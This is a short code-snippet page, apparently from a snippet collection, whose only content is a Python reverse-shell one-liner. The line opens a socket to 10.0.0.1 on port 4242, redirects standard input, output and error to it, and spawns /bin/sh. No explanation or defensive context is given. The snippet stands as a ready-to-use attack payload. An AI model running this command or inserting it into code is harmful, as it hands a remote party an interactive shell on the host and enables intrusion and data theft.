---
id: a3b4fa19-8dca-4434-80b3-c88c9be2197e
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:24.245805+00:00'
updated_at: '2023-04-10T20:25:25.998104+00:00'
---

# Code Snippet a3b4fa19

**Language**: Python

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
